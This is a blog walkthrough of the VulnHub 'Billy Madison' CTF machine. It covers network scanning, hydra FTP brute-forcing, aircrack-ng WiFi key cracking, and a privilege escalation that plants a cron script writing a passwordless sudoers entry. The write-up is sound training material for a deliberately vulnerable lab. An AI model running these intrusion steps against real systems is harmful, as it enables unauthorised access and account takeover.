<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Billy Madison VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-billy-madison-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-11-29T08:09:17+00:00">November 29, 2016</time><time class="updated" datetime="2025-06-10T20:30:23+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p style="text-align: justify;"><span style="color: #000000;">Today in our CTF challenge series we are going to do Billy Madison. This VM is based on 90’s movie Billy Madison, hence the name of the VM. The main aim of this VM is to figure out how Eric took over the machine and then undo his changes so you can recover Billy’s 12th-grade final project. You will probably need to root the VM to complete this objective. Without further ado let’s start.</span></p>
<p style="text-align: justify;"><span style="color: #000000;">Download the lab from <strong>https://www.vulnhub.com/entry/billy-madison-11,161/</strong></span></p>
<h3 style="text-align: justify;"><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<p style="text-align: justify;"><span style="color: #000000;">Let’s locate our target first.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-3mBAIeTyoZI/WD0p9UUlG2I/AAAAAAAAOVc/ON_I6SnUqHknc9DhYNG1l4HYpqDEAp6zgCLcB/s1600/1.png"/></p>
<p><span style="color: #000000;">Our target is <strong>192.168.1.103.</strong> Scan it with nmap.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.103</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-AU-9yNgGl5o/WD0qEUNH02I/AAAAAAAAOWE/bgyBhsFVYN4cV4gxqQNukPFPj7dDuxTIgCLcB/s1600/2.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Okay! So from nmap we have discovered the port : <strong>22, 23, 69, 80, 137, 138, 139, 445, 2525. </strong>So, I opened our target in the browser at port 69.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-hN9RcUW63TY/WD0qOi2KqeI/AAAAAAAAOWw/DVRe8Avts2wZCXnh68ABoFKmyvoGA-5yQCEw/s1600/3.png"/></p>
<p><span style="color: #000000;">A WordPress website opens. I explored this lot and tried to exploit it but it was useless. So I simply opened our target in the browser at its by-default port i.e. 80. The following page opens.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Y5AWq8udqj0/WD0qTUEpI4I/AAAAAAAAOXU/xeg6SDFvBa0K6t3p9C5nVk5NWVIhtfnnwCEw/s1600/4.png"/></p>
<p><span style="color: #000000;">Then I explored the smb port.</span></p>
<pre class="lang:default decode:true">smbclient -L 192.168.0.103</pre>
<p><span style="color: #000000;">When it asks for a password then just hit enter without entering a password.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-zmYLAy3s7cc/WD0qStKT-8I/AAAAAAAAOXQ/hEdd37gk23QZxF5iy7QyoCJZSKexBw3WACEw/s1600/5.png"/></p>
<p><span style="color: #000000;">It just told us that backdoor is currently closed. So then I traversed telnet.</span></p>
<pre class="lang:default decode:true">telnet 192.168.0.103</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-5bOBZ9-55dM/WD0qUHqpSWI/AAAAAAAAOXw/YsoojmqCTNM9XcbVWAoCbW-DIoFapPM5ACEw/s1600/7.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">There was a message in telnet telling us the password and that it has been encrypted with ROT13(hint: ROTten). Let’s decode it.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-rNHCx0MkTsw/WD0qV8S4-_I/AAAAAAAAOXw/qrW7-aiWycE8NJ5tglpR2tdLR6q8gAfBwCEw/s1600/8.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">By decrypting it, it comes to be as <strong>exschmenuating. </strong>Now this could be a directory so I opened it in the browser</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-67QIt_gE6nE/WD0qVk_dHqI/AAAAAAAAOXw/ZSBUN4UnnEQ3M5GzYr3bfAuGnXB1Q4UWQCEw/s1600/9.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Now in the browser, it opened a webpage which gave us a few hints for moving forward. Through conclusion, we now know that there is <strong>a .cap file</strong>. And that it is saved with the name which includes ‘<strong>veronica’</strong> and that name and is derived from <strong>rockyou.txt</strong>.</span></p>
<p style="text-align: justify;"><span style="color: #000000;">Now there are many names in rockyou.txt but we only need the ones with to have Veronica in it and for that use the following command:</span></p>
<pre class="lang:default decode:true">grep –i veronica /usr/share/wordslists/rockyou.txt &gt; /root/Desktop/dict.txt</pre>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-g4MTDg_5h74/WD0p9W2To2I/AAAAAAAAOXo/q3ozFnIXNR8uSMM4UBOmvh1bcthn0tJ4gCEw/s1600/10.png"/></p>
<p>Execution of the above command will create a text file with names Veronica in it. Now use this text file and find the file which had Veronica in it through DirBuster. And for this, open DirBuster and give the <strong>URL</strong> in the <strong>Target URL</strong> text box and then give the <strong>path of the text file</strong> you just created using grep command. Give the <strong>directory name</strong> in <strong>Dir to start with the text box</strong> and then give <strong>cap</strong> as the <strong>file extension</strong>.</p>
<p><img decoding="async" class="" src="https://4.bp.blogspot.com/-MN8lnEptNhM/WD0p9tM6oGI/AAAAAAAAOXo/yZEgaZFF0PAJh3zo-3KfX7eQwmLuwix8ACEw/s1600/11.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">As a result, it will show you<strong> 012987veronica.cap </strong>file<strong>.</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-_GfcrZu8xmM/WD0p-mTW23I/AAAAAAAAOXo/Yaj4Ha3SmAE8GfHUiCfo2qPAKzhTVqtLwCEw/s1600/12.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Open it in the browser. It will ask you to download it, go ahead with it.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://2.bp.blogspot.com/-UkRJt7hruqw/WD0p-TalAPI/AAAAAAAAOXo/moS-ErInjCENYuQiVi5EULXmvYG4X-G3wCEw/s1600/13.png"/></p>
<p><span style="color: #000000;">Now check the TCP stream of every packet. In of it, you will find an email sent from Eric to Veronica, telling her to download a certain antivirus.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-hDT82Y9VVcA/WD0qAJB4MoI/AAAAAAAAOXw/5-aCDCIQkmotX6ceAbIuonpCqSO6GRYkwCEw/s1600/14.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">In another TCP stream, you will find that Veronica has replied to Eric, saying that to share the link through FTP server along with a youtube link.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-I3dlPU9eJOg/WD0p_TwV9sI/AAAAAAAAOXw/_45Kohi3A9cdVqROEJ1-bad3lsvnySy7wCEw/s1600/15.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Again in a TCP stream of a packet, you will find that Eric has told her about his username and password.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-h6x3eXouKek/WD0qAt2uxTI/AAAAAAAAOXw/Gdp7fhm8QCYOYgs77KcRpqtk9oWuk3qxACEw/s1600/16.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Ok! So we have eric’s username and password. Keep that with you for later use. Meanwhile, let’s check out the youtube link.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-b0bpFKtIth4/WD0qCFbBEXI/AAAAAAAAOXw/6hQWDEqLEhkoRSa-fwZmrWNNIkm2XdBsQCEw/s1600/17.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">In the video, it says the combination of some numbers. Now, these numbers could be used for port knocking. So, let’s try it.</span></p>
<pre class="lang:default decode:true">for x in 1466 67 1468 1514 1981 1986; do nmap -Pn --host_timeout 201 --max-retries 0 –p $x 192.168.0.103; done</pre>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-2bOsw1RboD0/WD0qC42XXHI/AAAAAAAAOXw/WcspmThQsV0TLJSZl6UHmzwbwbqTolm7ACEw/s1600/18.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Then to check I fired up the nmap again.</span></p>
<pre class="lang:default decode:true">nmap -p- 192.168.0.103</pre>
<p style="text-align: justify;"><img decoding="async" src="https://2.bp.blogspot.com/-NObrD9hBt_g/WD0qDWtlzeI/AAAAAAAAOXw/-9WGfr6dciQGcicMcew5rr7CELqt82fFQCEw/s1600/19.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">And Voila!! FTP port opened on 21. Lets’ enter through it now as we have username and password. Remember The password and username for eric we discovered earlier.</span></p>
<pre class="lang:default decode:true">ftp 192.168.0.103</pre>
<p style="text-align: justify;"><span style="color: #000000;">Now let’s see the directories in it.</span></p>
<pre class="lang:default decode:true">dir</pre>
<p style="text-align: justify;"><span style="color: #000000;">There is a file named .notes. I decided to read it but before doing so I had to download it, therefore, type :</span></p>
<pre class="lang:default decode:true">get .notes
exit</pre>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-bbKw-ryJPHc/WD0qFTGsDfI/AAAAAAAAOXw/N18FhHjITTkTgwQJleB3AkCmfroYtosvACEw/s1600/20.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Now that notes file is downloaded, type the following command in the terminal of kali to read it:</span></p>
<pre class="lang:default decode:true">cat .notes</pre>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-GQDa-ktvHaA/WD0qFlDdN3I/AAAAAAAAOXw/naSA32x4CKUSXMkyHZJ--WynKOLoLQkLACEw/s1600/21.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">There was a message in the notes by eric. Now if you remember the conversation of Veronica and eric then you would know that there are two users on the ftp server. the second one is Veronica. Naturally, I decided to use hydra to apply the brute force attack on FTP to get the username and password using the same dictionary file which I had created with grep.</span></p>
<pre class="lang:default decode:true">hydra –l veronica –P /root/Desktop/ver.txt ftp://192.168.0.103</pre>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-W32oI9VWCLY/WD0qGOSOcFI/AAAAAAAAOXw/8W_DHp1JtcUaODQdfpB3hW3wUwsmXuIZwCEw/s1600/22.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">And yes!! We have the password along with username i.e. <strong>veronica and </strong><a style="color: #000000;" href="mailto:babygirl_veronica07@yahoo.com"><strong>babygirl_veronica07@yahoo.com</strong></a> respectively. Then I decided to explore more of FTP with veronica’s username and password and I found two files there: one is of .cap and other .eml and downloaded them both and to achieve so type the combination of the following commands:</span></p>
<pre class="lang:default decode:true">ftp 192.168.0.103
dir
binary
get eg-01.cap
get email-from-billy.eml</pre>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-Iyv4QlOnFho/WD0qHveg6OI/AAAAAAAAOXw/rQ-Jsyd4MlQSIU8E23wT6DzHVQQHEn6gwCEw/s1600/23.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Let’s read the email now.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-hYJrMiNhmHA/WD0qLTAzNbI/AAAAAAAAOXw/i9SvXphVPv8y2VloZsvXvlfMjiXXEMk0wCEw/s1600/26.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">In the mail, he says how he hacks Eric’s wireless password. But if you observe everything you will find that he has used swaks to send this mail. Now swaks is an SMTP server that is a featureful, flexible, scriptable, transaction-oriented tool developed by John Jetmore. So, therefore I used the following command next:</span></p>
<pre class="lang:default decode:true">swaks --to eric@madisonhotels.com --from vvaughn@polyfector.edu --server 192.168.0.104:2525 – body "My kid will be a soccer player"  --header "Subject: My kid will be soccer player"</pre>
<p style="text-align: justify;"><img decoding="async" src="https://2.bp.blogspot.com/-Ct1aLF4mdJs/WD0qK_O1_CI/AAAAAAAAOXw/Q4htBOrQ-KsHuJDVFh_K3JLEtr3IWN80wCEw/s1600/27.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Further, I used aircrack-ng to monitor eg-01.cap to because the email that was sent through the swaks mentioned something about the wifi password.</span></p>
<pre class="lang:default decode:true">aircrack-ng /root/Desktop/eg-01.cap –w /usr/share/wordlists/rockyou.txt</pre>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-x21VU2c72j4/WD0qIgrV3PI/AAAAAAAAOXw/EuhFnxf1scUdrQWG9dL5OF6gKJ2hJXNSACEw/s1600/24.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">And with aircrack-ng, we found the password of wireless i.e.<strong> triscuit*.</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-HwuGPIDsrbo/WD0qJPDvX4I/AAAAAAAAOXw/_WZc6YRdYrQTUm6NnRY8kmbbpodMohKVACEw/s1600/25.png"/></p>
<p><span style="color: #000000;">Now if you again scan it with nmap.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.0.103</pre>
<p><img decoding="async" src="https://2.bp.blogspot.com/-AVsienBDJOw/WD0qMr_pTQI/AAAAAAAAOXw/EZkMtS3743Qgln1YG2mdbvTlHe4wpfIOACEw/s1600/28.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">As a result, you can see that a new port opens i.e. 1974 with SSH service. Let’s try and log in with SSH.</span></p>
<pre class="lang:default decode:true">ssh eric@192.168.0.103 –p 1974</pre>
<p style="text-align: justify;"><span style="color: #000000;">And then give the password <strong>triscuit*</strong>. Once I was logged in I checked it Linux version with the following command but it was not exploitable.</span></p>
<pre class="lang:default decode:true">lsb_release –a</pre>
<p style="text-align: justify;"><span style="color: #000000;">Then typed following command to see what it has to offer :</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>ls</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">There I found a text file so I decided to read it.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>cat why-1974.txt</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-CUf-u0OwTN8/WD0qOYh7YOI/AAAAAAAAOXw/e2MS77RuEhYSRDXMDsgIlkgh_u4jwx5AACEw/s1600/29.png"/></p>
<p><span style="color: #000000;">Then type the following command:</span></p>
<pre class="lang:default decode:true">find / -perm -2000 –type f 2&gt;/dev/null</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-1_6Q5TMBO7w/WD0qO-GKTAI/AAAAAAAAOXw/VlMqjvsh5B8XOpl2XkV2KqwV-RimcMAbQCEw/s1600/30.png"/></p>
<p><span style="color: #000000;">I was pretty lost here so decided to take some help from Mr Goblin (<a style="color: #000000;" href="https://g0blin.co.uk/billy-madison-1-vulnhub-writeup/">https://g0blin.co.uk/billy-madison-1-vulnhub-writeup/</a>) and so type the following set of commands:</span></p>
<pre class="lang:default decode:true ">touch /tmp/test
/usr/local/share/sgml/donpcgd /tmp/test /etc/cron.hourly/test
echo -e '#!/bin/bash\necho "eric ALL=(ALL) NOPASSWORD:ALL" &gt;&gt; /etc/sudoers' &gt; /etc/cron.hourly/test
chmod +x /etc/cron.hourly/test
cat /etc/chron.hourly/test</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-Sn730j-EgcI/WD0qPbBxS7I/AAAAAAAAOXw/Bu1htezDRn0dobYNEfFnJRhNhEHj-0pTgCEw/s1600/31.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">This way you will escalate the privileges and reach the root. Let’s see what files root has:</span></p>
<pre class="lang:default decode:true">ls</pre>
<p style="text-align: justify;"><span style="color: #000000;">I decided to read /PRIVATE file.</span></p>
<pre class="lang:default decode:true">cd /PRIVATE
ls</pre>
<p style="text-align: justify;"><span style="color: #000000;">Here, I found hint.txt and BowelMovement files. First I opened hint.txt.</span></p>
<pre class="lang:default decode:true">cat hint.txt</pre>
<p style="text-align: justify;"><span style="color: #000000;">In this file, he is talking about the BowelMovement file and about its password which is the link given. So I copied the BowelMovement file.</span></p>
<pre class="lang:default decode:true">cp BowelMovement /var/www/html
</pre>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-ofqb8o0hTQs/WD0qP1pljKI/AAAAAAAAOXw/ek3axyf2HCk4bjmH0GoFWYSW2R9a3KcHwCEw/s1600/32.png"/></p>
<p><span style="color: #000000;">And then I created a dictionary file using cewl and that link.</span></p>
<pre class="lang:default decode:true">cewl --depth 0 https://en.wikipedia.org/wiki/Billy_Madison &gt; /root/Desktop/billt.txt</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-aU5HoLsgryM/WD0qP_COb4I/AAAAAAAAOXw/MqaKsT7C_icToZNi-T6icdId7xRk-mufgCEw/s1600/33.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">By brute force, you will find the correct password from this dictionary file. Using that password open the movement file that you have downloaded. BowelM.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-EJU8DGdtlpg/WD0qQrIlDsI/AAAAAAAAOXw/E73-jHafoy8O0jLY_zgZzw2CsEa0O8WDwCEw/s1600/35.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">And then open the same in the terminal of kali and type :</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>ls</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">There is a file called secret.zip, unzip it.</span></p>
<pre class="lang:default decode:true">unzip secret.zip</pre>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-qeJ9Fj8WA4s/WD0qQ9n5i0I/AAAAAAAAOXw/E-i5_kdowLgbcsfWE9OgYq1Secb7x4bqACEw/s1600/36.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">In the zipped folder, there were two files. I decided to read them both.</span></p>
<pre class="lang:default decode:true">cat THE-END.txt
cat Billy_Madison12th_Grade_Fimal_Project.doc</pre>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-c0XZucnHBQA/WD0qSMJLwbI/AAAAAAAAOXw/xDlxZNpsAhYg5ngoijDCtWjQ1nqsZ-tTgCEw/s1600/37.png"/></p>
<p><span style="color: #000000;">Finally! We have solved the CTF. Enjoy!</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact</span> <strong><a class="broken_link" href="https://www.linkedin.com/in/yashika-dhir/">here</a>.</strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
